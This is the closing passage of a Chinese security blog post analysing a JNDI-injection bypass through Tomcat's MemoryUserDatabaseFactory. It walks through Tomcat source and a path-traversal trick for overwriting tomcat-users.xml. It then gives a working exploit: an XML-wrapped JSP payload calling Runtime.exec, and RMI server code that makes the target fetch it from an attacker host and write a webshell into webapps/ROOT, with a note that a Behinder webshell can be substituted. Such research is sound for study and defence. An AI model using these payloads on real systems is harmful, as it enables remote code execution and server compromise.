&#125;</span><br><span class="line">	<span class="comment">//从引用对象中获取readonly属性</span></span><br><span class="line">              ra = ref.get(<span class="string">&quot;readonly&quot;</span>);</span><br><span class="line">              <span class="keyword">if</span> (ra != <span class="keyword">null</span>) &#123;</span><br><span class="line">                  database.setReadonly(Boolean.parseBoolean(ra.getContent().toString()));</span><br><span class="line">              &#125;</span><br><span class="line"><span class="comment">//从引用对象中获取watchSource属性</span></span><br><span class="line">              ra = ref.get(<span class="string">&quot;watchSource&quot;</span>);</span><br><span class="line">              <span class="keyword">if</span> (ra != <span class="keyword">null</span>) &#123;</span><br><span class="line">                  database.setWatchSource(Boolean.parseBoolean(ra.getContent().toString()));</span><br><span class="line">              &#125;</span><br><span class="line">	<span class="comment">//调用open</span></span><br><span class="line">              database.open();</span><br><span class="line">              <span class="comment">//只有readonly属性为false才会进入save方法，readonly属性可以通过引用中获取</span></span><br><span class="line">              <span class="keyword">if</span> (!database.getReadonly()) &#123;</span><br><span class="line">                  <span class="comment">//调用save</span></span><br><span class="line">                  database.save();</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">return</span> database;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>​        <code>open</code>方法会去加载远程的xml文件并进行解析。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.writeLock.lock();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.users.clear();</span><br><span class="line">        <span class="keyword">this</span>.groups.clear();</span><br><span class="line">        <span class="keyword">this</span>.roles.clear();</span><br><span class="line">        <span class="comment">//从之前保存的属性中获取pathName</span></span><br><span class="line">        String pathName = <span class="keyword">this</span>.getPathname();</span><br><span class="line">        <span class="comment">//创建URI对象</span></span><br><span class="line">        URI uri = ConfigFileLoader.getURI(pathName);</span><br><span class="line">        URLConnection uConn = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//请求url并获取内容</span></span><br><span class="line">            URL url = uri.toURL();</span><br><span class="line">            uConn = url.openConnection();</span><br><span class="line">            InputStream is = uConn.getInputStream();</span><br><span class="line">            <span class="keyword">this</span>.lastModified = uConn.getLastModified();</span><br><span class="line">            Digester digester = <span class="keyword">new</span> Digester();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                digester.setFeature(<span class="string">&quot;http://apache.org/xml/features/allow-java-encodings&quot;</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var28) &#123;</span><br><span class="line">                log.warn(sm.getString(<span class="string">&quot;memoryUserDatabase.xmlFeatureEncoding&quot;</span>), var28);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            digester.addFactoryCreate(<span class="string">&quot;tomcat-users/group&quot;</span>, <span class="keyword">new</span> MemoryGroupCreationFactory(<span class="keyword">this</span>), <span class="keyword">true</span>);</span><br><span class="line">            digester.addFactoryCreate(<span class="string">&quot;tomcat-users/role&quot;</span>, <span class="keyword">new</span> MemoryRoleCreationFactory(<span class="keyword">this</span>), <span class="keyword">true</span>);</span><br><span class="line">            digester.addFactoryCreate(<span class="string">&quot;tomcat-users/user&quot;</span>, <span class="keyword">new</span> MemoryUserCreationFactory(<span class="keyword">this</span>), <span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">//解析请求后的内容</span></span><br><span class="line">            digester.parse(is);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var29) &#123;</span><br><span class="line">            log.error(sm.getString(<span class="string">&quot;memoryUserDatabase.fileNotFound&quot;</span>, <span class="keyword">new</span> Object[]&#123;pathName&#125;));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var30) &#123;</span><br><span class="line">            <span class="keyword">this</span>.users.clear();</span><br><span class="line">            <span class="keyword">this</span>.groups.clear();</span><br><span class="line">            <span class="keyword">this</span>.roles.clear();</span><br><span class="line">            <span class="keyword">throw</span> var30;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (uConn != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    uConn.getInputStream().close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var27) &#123;</span><br><span class="line">                    log.warn(sm.getString(<span class="string">&quot;memoryUserDatabase.fileClose&quot;</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">this</span>.pathname&#125;), var27);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.writeLock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        而在parse的过程中会对获取到的xml解析,因此存在xxe漏洞。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">parse</span><span class="params">(InputStream input)</span> <span class="keyword">throws</span> IOException, SAXException </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.configure();</span><br><span class="line">      InputSource is = <span class="keyword">new</span> InputSource(input);</span><br><span class="line">      <span class="keyword">this</span>.getXMLReader().parse(is);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.root;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220118222456369.png" alt="image-20220118222456369"></p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>​    前面也说过<code>MemoryUserDatabase</code>存储了Tomcat的用户信息并且会存储到xml，那么我们也知道tomcat中的用户信息是在<code>tomcat-users.xml</code>中的，所以是否我们直接在xml中构建一个我们已知账号密码的xml，让其加载。</p>
<p>​    在open方法加载远程xml并解析后，如果readonly属性我们设置为false会进入save方法保存xml。</p>
<p>​    save方法首先判断isWriteable是否为true,否则直接返回</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.getReadonly()) &#123;</span><br><span class="line">            log.error(sm.getString(<span class="string">&quot;memoryUserDatabase.readOnly&quot;</span>));</span><br><span class="line">            <span class="comment">//判断isWriteable是否为true，否则直接返回</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.isWriteable()) &#123;</span><br><span class="line">            log.warn(sm.getString(<span class="string">&quot;memoryUserDatabase.notPersistable&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            File fileNew = <span class="keyword">new</span> File(<span class="keyword">this</span>.pathnameNew);</span><br><span class="line">            <span class="keyword">if</span> (!fileNew.isAbsolute()) &#123;</span><br><span class="line">                fileNew = <span class="keyword">new</span> File(System.getProperty(<span class="string">&quot;catalina.base&quot;</span>), <span class="keyword">this</span>.pathnameNew);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>​    在<code>isWriteable</code>中会将<code>catalina.base</code>和<code>pathname</code>拼接并判断其目录是否存在如果不存在则返回false。可以看到我们的url地址被处理为<code>\http:\127.0.0.1\tomcat-user.xml</code>这种形式，所以我们可以通过<code>http://127.0.0.1/../../tomcat-user.xml</code>来绕过，也不会影响xml的加载。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220118230336387.png" alt="image-20220118230336387"></p>
<p>​    后面就是执行xml文件写入的功能，可以看到执行完后用户的配置文件已经写入到目标目录下，由于真正的配置是在conf目录下的，所以url中还要加个conf目录。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220118231142917.png" alt="image-20220118231142917"></p>
<p>​    但是这种绕过方式和Tomcat的版本有关，在Tomcat8的open方法中是通过<code> ConfigFileLoader.getURI(pathName);</code>来获取xml的是可以加载远程XML的。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220119101645630.png" alt="image-20220119101645630"></p>
<p>​    在Tomcat7版本中open方法中是通过<code> ConfigFileLoader.getInputStream(pathName);</code>获取的。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220119102453745.png" alt="image-20220119102453745"></p>
<p>​    在<code>getInputStream</code>中首先通过file协议加载加载失败才会通过URL记载，所以这种利用方式似乎不能用在Tomcat7的版本，但是高版本的利用本身也有EL表达式，因此<code>MemoryUserDatabaseFactory</code>利用链似乎 有些鸡肋，但是从学习的角度来看还是很有价值的。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220119102534828.png" alt="image-20220119102534828"></p>
<h3 id="写文件利用"><a href="#写文件利用" class="headerlink" title="写文件利用"></a>写文件利用</h3><p>​        在tomcat7的<code>ConfigFileLoader#getInputStream</code>中，只有当文件已经存在时才会通过<code>FileInputStream</code>加载，如果我们传入的文件不存在，还是会去远程加载文件。因此可以让目标加载我们写好的shell到web目录中。首先开启http服务，并创建<code>webapps/ROOT/test.jsp</code>文件，内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tomcat-users</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://tomcat.apache.org/xml&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;<span class="symbol">&amp;#x3c;</span>%Runtime.getRuntime().exec(<span class="symbol">&amp;#x22;</span>calc.exe<span class="symbol">&amp;#x22;</span>); %<span class="symbol">&amp;#x3e;</span>&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tomcat-users</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        这里还要写成XML的形式否则XML解析过程中会失败。开启RMI服务，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;org.apache.catalina.UserDatabase&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="keyword">true</span>, <span class="string">&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">  ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;pathname&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/../../webapps/ROOT/test.jsp&quot;</span>));</span><br><span class="line">  ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;readonly&quot;</span>, <span class="string">&quot;false&quot;</span>));</span><br><span class="line">  ReferenceWrapper war=<span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">  Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">  registry.bind(<span class="string">&quot;xxx&quot;</span>,war);</span><br></pre></td></tr></table></figure>

<p>​        由于我们传入的文件名不存在，因此还是会加载远程文件。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220124102226863.png" alt="image-20220124102226863"></p>
<p>​        最后成功在ROOT目录下写入jsp文件。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220124102337397.png" alt="image-20220124102337397"></p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220124102351835.png" alt="image-20220124102351835"></p>
<p>​    rolename中的内容也可以替换冰蝎马，只要Unicode编码后即可。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        本文讨论的绕过主要是针对Tomcat下的利用，大多数的利用方式建立在tomcat的BeanFactory利用之上，通过上面的分析，我们对这些利用链的发现思路做一个总结。</p>
<ul>
<li>寻找可以执行命令的函数，可以直接传入一个string参数执行命令（EL、MVEL、Groovy、Beanshell）</li>
<li>寻找UrlClassLoader，但是这种除了GroovyClassLoader比较特殊会在加载的过程中执行命令，其他实现UrlClassLoader的类加载后并不会实例化</li>
<li>已知存在漏洞的组件，可以直接传入String参数利用后间接执行命令(Xstrem、snakeyaml)</li>
</ul>
<p>我们从利用的角度再思考一下，目前挖掘这么多利用链的方式其实主要是想解决tomcat低版本下的绕过，虽然<code>MemoryUserDatabaseFactory</code>RCE的方式无法在Tomcat7利用，但是还是可以通过写webshell的方式利用。最后感谢<code>浅蓝</code>师傅的分享。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/">探索高版本 JDK 下 JNDI 漏洞的利用方法</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Welk1n/p/11066397.html">浅析JNDI注入Bypass</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/漏洞利用/">漏洞利用</a>
    </span>
    

    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2022 藏青
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>